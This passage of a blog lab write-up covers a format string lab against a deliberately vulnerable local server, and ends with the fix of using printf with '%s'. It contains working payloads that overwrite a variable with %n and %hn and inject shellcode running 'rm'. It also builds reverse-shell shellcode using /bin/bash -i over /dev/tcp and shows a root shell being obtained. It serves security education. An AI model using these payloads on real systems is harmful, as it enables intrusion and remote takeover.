+<h2 id="Task-5-Change-the-Server-Program’s-Memory"><a href="#Task-5-Change-the-Server-Program’s-Memory" class="headerlink" title="Task 5: Change the Server Program’s Memory"></a>Task 5: Change the Server Program’s Memory</h2><h3 id="Task-5-A-Change-the-value-to-a-different-value"><a href="#Task-5-A-Change-the-value-to-a-different-value" class="headerlink" title="Task 5-A: Change the value to a different value"></a>Task 5-A: Change the value to a different value</h3><p>In this sub-task, we need to change the content of the <code>target</code> variable to something else. Your task is considered as a success if you can change it to a different value, regardless of what value it may be. </p>
+<p>We have known that the address of target is <code>0x0804a040</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> $(<span class="built_in">printf</span> <span class="string">"\x40\xa0\x04\x08"</span>)%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%n &gt; input5a</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> nc 127.0.0.1 9090 &lt; input5a</span></span><br></pre></td></tr></table></figure>
+
+<p>Then we find the value of target was modified to</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The value of the 'target' variable (after): 0x000000b5</span><br></pre></td></tr></table></figure>
+
+<h3 id="Task-5-B-Change-the-value-to-0x500"><a href="#Task-5-B-Change-the-value-to-0x500" class="headerlink" title="Task 5-B: Change the value to 0x500"></a>Task 5-B: Change the value to <code>0x500</code></h3><p>In this sub-task, we need to change to the content of the <code>target</code> variable to a specific value 0x500. Your task is considered as a success only if the variable’s value becomes 0x500. </p>
+<p><code>0x500</code>-<code>0xb3</code> = 1101, we need add 1101 characters before %p.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> $(<span class="built_in">printf</span> <span class="string">"\x40\xa0\x04\x08"</span>)*********************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%n &gt; input2</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> nc 127.0.0.1 9090 &lt; input2</span></span><br></pre></td></tr></table></figure>
+
+<p>Output:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@�*********************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************0xbffff0a00xb7fba0000x804871b0x30xbffff0e00xbffff6c80x804872d0xbffff0e00xbffff0b80x100x804864c0xb7e1b2cd0xb7fdb6290x100x30x82230002(nil)(nil)(nil)0x3bae00020x100007f(nil)(nil)</span><br><span class="line">The value of the 'target' variable (after): 0x00000500</span><br></pre></td></tr></table></figure>
+
+<h3 id="Task-5-C-Change-the-value-to-0xff990000"><a href="#Task-5-C-Change-the-value-to-0xff990000" class="headerlink" title="Task 5-C: Change the value to 0xff990000"></a>Task 5-C: Change the value to <code>0xff990000</code></h3><p>This sub-task is similar to the previous one, except that the target value is now a large number. Printing out this large number of characters may take hours. </p>
+<p>The basic idea is to use <code>%hn</code>, instead of %n, <strong>so we can modify a two-byte memory space</strong>, instead of four bytes. Printing out 2<sup>16</sup>  characters does not take much time. We can break the memory space of the target variable into two blocks of memory, each having two bytes. We just need to set one block to <code>0xFF99</code> and set the other one to <code>0x0000</code>. </p>
+<p><strong>This means that in your attack, you need to provide two addresses</strong> in the format string. In format string attacks, changing the content of a memory space to a very small value is quite challenging (please explain why in the report); <code>0x00</code> is an extreme case. To achieve this goal, we need to use an overflow technique. The basic idea is that when we make a number larger than what the storage allows, only the lower part of the number will be stored (basically, there is an integer overflow).</p>
+<p>For example, if the number 2<sup>16</sup> + 5 is stored in a 16-bit memory space, only 5 will be stored. Therefore, to get to zero, we just need to get the number to 2<sup>16</sup> = 65536.</p>
+<p>In this sub-task, we need use <code>%hn</code> to substitute <code>%n</code>. It will modify half word. So to change the value to <code>0xff990000</code>, we need to modify it by <code>0xff99</code> and <code>0x0000</code>, but 0 is impossible, we should implement this by overflow.  </p>
+<p>The two address is <code>0x0804a040</code> and <code>0x0804a042</code>, we need change the first two bytes into <code>0x10000</code>, and use <code>0xff99</code> to cover the overflow <code>0x1</code>.  </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo $(printf "\x42\xa0\x04\x08\x22\x22\x22\x22\x40\xa0\x04\x08")%655069x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%hn%0103x%hn &gt; input5c</span><br><span class="line"><span class="meta">$</span><span class="bash"> nc -u 127.0.0.1 9090 &lt; input5c</span></span><br></pre></td></tr></table></figure>
+
+<p>Output:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">                                                                                                                                                                                                                                                                                                 bfb1e0e0b76e0000 804871b       3bfb1e120bfb1e708 804872dbfb1e120bfb1e0f8      10 804864cb75412cdb7701629      10       382230002       0       0       0eae60002 100007f       0       00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000022222222</span><br><span class="line">The value of the 'target' variable (after): 0xff990000</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Task-6-Inject-Malicious-Code-into-the-Server-Program"><a href="#Task-6-Inject-Malicious-Code-into-the-Server-Program" class="headerlink" title="Task 6: Inject Malicious Code into the Server Program"></a>Task 6: Inject Malicious Code into the Server Program</h2><p>In this task we need modify the return address to the shell code. </p>
+<p>To get the offset, we need to push some <code>nop(0x90)</code>into the buffer array and get the offset.</p>
+<p>Using <code>gdb</code> file, we get:</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">the value of msg(the address of buf): 0xbfffe718</span><br><span class="line">the return address: 0xbfffe740</span><br><span class="line">the address of msg: 0xbfffe700</span><br><span class="line">the address of the return address: 0xbfffe6bc</span><br></pre></td></tr></table></figure>
+
+<p>So we construct a payload:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> $(<span class="built_in">printf</span> <span class="string">"\xbc\x6f\xff\xbf"</span>)%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%hn$(<span class="built_in">printf</span> <span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span>) &gt;input</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> nc -u 127.0.0.1 9090 &lt; input</span></span><br></pre></td></tr></table></figure>
+
+<p>Then we find the <code>nop</code> were injected in the area of <code>0xbfffe790</code>, we get the offset = <code>0xbfffe790-0xbfffe718=0x78</code>.</p>
+<p>So we can modify the return address into <code>0xbffff0e0+0x78=bffff158</code>.</p>
+<p>Use the same idea in Task 5-C, we need change the two-byte at <code>0xbffff09c</code> and the two-byte at <code>0xbffff09e</code>. It’s origin value is <code>0x0804872d</code>, we get <code>0xbfff-3*4-22*4=48963</code>, and <code>0xf158-0xbfff=12633</code>, Then we try to construct a payload below. Trying a few times and change the value of the second value into 12611, we succeed.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> $(<span class="built_in">printf</span> <span class="string">"\x9e\xf0\xff\xbf\x11\x11\x11\x11\x9c\xf0\xff\xbf"</span>)%048963x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%hn%012611x%hn$(<span class="built_in">printf</span> <span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\\x31\xc0\x50\x68bash\x68////\x68/bin\x89\xe3\x31\xc0\x50\x68-ccc\x89\xe0\x31\xd2\x52\x68ile \x68/myf\x68/tmp\x68/rm \x68/bin\x89\xe2\x31\xc9\x51\x52\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80"</span>) &gt; input6</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> nc -u 127.0.0.1 9090 &lt;input6</span></span><br></pre></td></tr></table></figure>
+
+<p>Output:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[11/21/19]seed@VM:/tmp$ touch myfile</span><br><span class="line">[11/21/19]seed@VM:/tmp$ ls</span><br><span class="line">config-err-9j0iw4</span><br><span class="line">myfile</span><br><span class="line">systemd-private-d58ef22a100b4a8d92cde9ff2620e54e-colord.service-4AAjYt</span><br><span class="line">systemd-private-d58ef22a100b4a8d92cde9ff2620e54e-rtkit-daemon.service-SaKdq1</span><br><span class="line">unity_support_test.1</span><br><span class="line">[11/21/19]seed@VM:/tmp$ ls</span><br><span class="line">config-err-9j0iw4</span><br><span class="line">systemd-private-d58ef22a100b4a8d92cde9ff2620e54e-colord.service-4AAjYt</span><br><span class="line">systemd-private-d58ef22a100b4a8d92cde9ff2620e54e-rtkit-daemon.service-SaKdq1</span><br><span class="line">unity_support_test.1</span><br><span class="line">[11/21/19]seed@VM:/tmp$</span><br></pre></td></tr></table></figure>
+
+<h2 id="Task-7-Getting-a-Reverse-Shell"><a href="#Task-7-Getting-a-Reverse-Shell" class="headerlink" title="Task 7: Getting a Reverse Shell"></a>Task 7: Getting a Reverse Shell</h2><p>To get a reverse shell, all we need is change somewhere in the shell code.</p>
+<p>We need to split <code>/bin/bash -i &gt; /dev/tcp/127.0.0.1/7070 0&lt;&amp;1 2&gt;&amp;1</code> and substitute code between line  1 and line 2,</p>
+<p>that is:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"\x31\xc0"</span> <span class="comment">// xorl %eax, %eax : eax = 0</span></span><br><span class="line"><span class="string">"\x50"</span> <span class="comment">// pushl $eax : 0 marks the end of a string</span></span><br><span class="line"><span class="string">"\x68"</span><span class="string">"bash"</span> <span class="comment">// pushl "bash"</span></span><br><span class="line"><span class="string">"\x68"</span><span class="string">"////"</span> <span class="comment">// pushl "////" : "////" is equivalent to "/"</span></span><br><span class="line"><span class="string">"\x68"</span><span class="string">"/bin"</span> <span class="comment">// pushl "/bin"</span></span><br><span class="line"><span class="string">"\x89\xe3"</span> <span class="comment">// movl %esp, %ebx : Save the string address to ebx</span></span><br><span class="line"><span class="comment">// Push "-ccc" into stack.</span></span><br><span class="line"><span class="string">"\x31\xc0"</span> <span class="comment">// xorl %eax, %eax " eax = 0</span></span><br><span class="line"><span class="string">"\x50"</span> <span class="comment">// pushl $eax : 0 marks the end of a string</span></span><br><span class="line"><span class="string">"\x68"</span><span class="string">"-ccc"</span> <span class="comment">// pushl "-ccc" : "-ccc" is equivalent to "-c"</span></span><br><span class="line"><span class="string">"\x89\xe0"</span> <span class="comment">// movl %esp, %eax : Save the string address to eax</span></span><br><span class="line"><span class="comment">// Push "/bin/rm /tmp/myfile " into stack.</span></span><br><span class="line"><span class="string">"\x31\xd2"</span> <span class="comment">// xorl %edx, %edx : edx = 0</span></span><br><span class="line"><span class="string">"\x52"</span> <span class="comment">// pushl %edx : 0 marks the end of a string</span></span><br><span class="line"><span class="string">"\x68"</span><span class="string">"ile "</span> <span class="comment">// pushl "ile " ➀</span></span><br><span class="line"><span class="string">"\x68"</span><span class="string">"/myf"</span> <span class="comment">// pushl "/myf"</span></span><br><span class="line"><span class="string">"\x68"</span><span class="string">"/tmp"</span> <span class="comment">// pushl "/tmp"</span></span><br><span class="line"><span class="string">"\x68"</span><span class="string">"/rm "</span> <span class="comment">// pushl "/rm "</span></span><br><span class="line"><span class="string">"\x68"</span><span class="string">"/bin"</span> <span class="comment">// pushl "/bin" ➁</span></span><br><span class="line"><span class="string">"\x89\xe2"</span> <span class="comment">// movl %esp,%edx : Save the string address to edx</span></span><br><span class="line"><span class="string">"\x31\xc9"</span> <span class="comment">// xorl %ecx, %ecx</span></span><br><span class="line"><span class="string">"\x51"</span> <span class="comment">// pushl %ecx : argv[3] = 0</span></span><br><span class="line"><span class="string">"\x52"</span> <span class="comment">// pushl %edx : argv[2] = address of "/bin/rm ..."</span></span><br><span class="line"><span class="string">"\x50"</span> <span class="comment">// pushl %eax : argv[1] = address of "-c"</span></span><br><span class="line"><span class="string">"\x53"</span> <span class="comment">// pushl %ebx : argv[0] = address of "/bin/bash"</span></span><br><span class="line"><span class="string">"\x89\xe1"</span> <span class="comment">// movl %esp, %ecx : Save argv[]’s address to ecx</span></span><br><span class="line"><span class="string">"\x31\xd2"</span> <span class="comment">// xorl %edx, %edx : Let edx = 0</span></span><br><span class="line"><span class="string">"\x31\xc0"</span> <span class="comment">// xorl %eax, %eax</span></span><br><span class="line"><span class="string">"\xb0\x0b"</span> <span class="comment">// movb $0x0b, %al : 0x0b is execve()’s number</span></span><br><span class="line"><span class="string">"\xcd\x80"</span> <span class="comment">// int 0x80 : Invoke the execve() system call</span></span><br></pre></td></tr></table></figure>
+
+<p>We can split that command into:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">\x68/bin</span><br><span class="line">\x68/bas</span><br><span class="line">\x68h -i</span><br><span class="line">\x68 &gt; /</span><br><span class="line">\x68dev/</span><br><span class="line">\x68tcp/</span><br><span class="line">\x68127.</span><br><span class="line">\x680.0.</span><br><span class="line">\x681/70</span><br><span class="line">\x6870 0</span><br><span class="line">\x68&lt;&amp;1 </span><br><span class="line">\x682&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>and then we get the payload:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> $(<span class="built_in">printf</span> <span class="string">"\x9e\xf0\xff\xbf\x11\x11\x11\x11\x9c\xf0\xff\xbf"</span>)%048963x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%hn%012611x%hn$(<span class="built_in">printf</span> <span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\\x31\xc0\x50\x68bash\x68////\x68/bin\x89\xe3\x31\xc0\x50\x68-ccc\x89\xe0\x31\xd2\x52\x682&gt;&amp;1\x68&lt;&amp;1 \x6870 0\x681/70\x680.0.\x68127.\x68tcp/\x68dev/\x68 &gt; /\x68h -i\x68/bas\x68/bin\x89\xe2\x31\xc9\x51\x52\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80"</span>) &gt; input7</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> nc -u 127.0.0.1 9090 &lt;input7</span></span><br></pre></td></tr></table></figure>
+
+<p>Output:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">[11/21/19]seed@VM:~/.../formatString$ nc -l 7070 -v</span><br><span class="line">Listening on [0.0.0.0] (family 0, port 7070)</span><br><span class="line">Connection from [127.0.0.1] port 7070 [tcp/*] accepted (family 2, sport 57044)</span><br><span class="line">root@VM:/home/seed/Documents/SoftwareSecurity/formatString# who am i</span><br><span class="line">who am i</span><br><span class="line">root@VM:/home/seed/Documents/SoftwareSecurity/formatString# whoami</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">root@VM:/home/seed/Documents/SoftwareSecurity/formatString# ls</span><br><span class="line">ls</span><br><span class="line">input1</span><br><span class="line">input2</span><br><span class="line">input3</span><br><span class="line">input5a</span><br><span class="line">input5b</span><br><span class="line">input5c</span><br><span class="line">input6</span><br><span class="line">input7</span><br><span class="line">peda-session-server.txt</span><br><span class="line">server</span><br><span class="line">server.c</span><br><span class="line">server.s</span><br><span class="line">root@VM:/home/seed/Documents/SoftwareSecurity/formatString# touch b.txt</span><br><span class="line">touch b.txt</span><br><span class="line">root@VM:/home/seed/Documents/SoftwareSecurity/formatString# ls</span><br><span class="line">ls</span><br><span class="line">b.txt</span><br><span class="line">input1</span><br><span class="line">input2</span><br><span class="line">input3</span><br><span class="line">input5a</span><br><span class="line">input5b</span><br><span class="line">input5c</span><br><span class="line">input6</span><br><span class="line">input7</span><br><span class="line">peda-session-server.txt</span><br><span class="line">server</span><br><span class="line">server.c</span><br><span class="line">server.s</span><br></pre></td></tr></table></figure>
+
+<p>Now we have got the root shell!</p>
+<h2 id="Task-8-Fix-the-problem"><a href="#Task-8-Fix-the-problem" class="headerlink" title="Task 8 Fix the problem"></a>Task 8 Fix the problem</h2><p>Remember the warning message generated by the <code>gcc</code> compiler? Please explain what it means. Please fix the vulnerability in the server program, and recompile it. Does the compiler warning go away? Do your attacks still work? You only need to try one of your attacks to see whether it still works or not.</p>
+<p>change <code>printf(msg);</code> into <code>printf(&quot;%s&quot;, msg);</code> recompile that.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cp server.c server2.c</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> after modify the server2.c</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gcc -z execstack -o server2 server2.c</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo ./server2</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> nc -u 127.0.0.1 9090</span></span><br></pre></td></tr></table></figure>
+
+<p>Then we find when we input <code>%p%p%p</code> on client VM, it will no longer print out the stack.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[11/21/19]seed@VM:~/.../formatString$ nc -u 127.0.0.1 9090</span><br><span class="line">test</span><br><span class="line"><span class="meta">%</span><span class="bash">p%p%p%p%p</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[11/21/19]seed@VM:~/.../formatString$ cp server.c server2.c</span><br><span class="line">[11/21/19]seed@VM:~/.../formatString$ subl server2.c </span><br><span class="line">[11/21/19]seed@VM:~/.../formatString$ gcc -z execstack -o server2 server2.c </span><br><span class="line">[11/21/19]seed@VM:~/.../formatString$ sudo ./server2</span><br><span class="line">The address of the secret: 0x080487c0</span><br><span class="line">The address of the 'target' variable: 0x0804a040</span><br><span class="line">The value of the 'target' variable (before): 0x11223344</span><br><span class="line">The address of the 'msg' argument: 0xbffff0a0</span><br><span class="line">test</span><br><span class="line">The value of the 'target' variable (after): 0x11223344</span><br><span class="line">The address of the 'msg' argument: 0xbffff0a0</span><br><span class="line"><span class="meta">%</span><span class="bash">p%p%p%p%p</span></span><br><span class="line">The value of the 'target' variable (after): 0x11223344</span><br></pre></td></tr></table></figure>
+
+<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>A good lab!!!!</p>
+
+  </article>
+</div>
+
+
+    
+
+
+
+
+</div>
+
+<div class="footer-wrapper container">
+  <footer class="footer clearfix">
+    <div class="clearfix">
+    <a href="http://simonnie98.github.io" class="footer-logo">
+      <i class="fa fa-github"></i>
+    </a>
+    <ul class="footer-social-link">
+      <li>© 2019 Simon Nie</li>
+      <li><a href="http://simonnie98.github.io">Home</a></li>
+      
+      <li><a href="https://github.com/SimonNie98" target="_blank" rel="noopener">Github</a></li>
+      
+    </ul>
+    <div class="footer-theme-info">
+      Theme <a href="//github.com/sabrinaluo/hexo-theme-replica" target="_blank" rel="noopener">Replica</a>
+      by <a href="//github.com/sabrinaluo" target="_blank" rel="noopener">Hiitea</a> ❤ Powered by Hexo
+    </div>
+    </div>
+    
+  </footer>
+</div>
+
+
+<script>
+  (function() {
+    var cx = '001135385136731589458:hwqr0dnpaxv';
+    var gcse = document.createElement('script');
+    gcse.type = 'text/javascript';
+    gcse.async = true;
+    gcse.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') +
+      '//cse.google.com/cse.js?cx=' + cx;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(gcse, s);
+  })();
+</script>
+
+
+
+<script src="/js/main.js"></script>
+
+</body>
+</html>
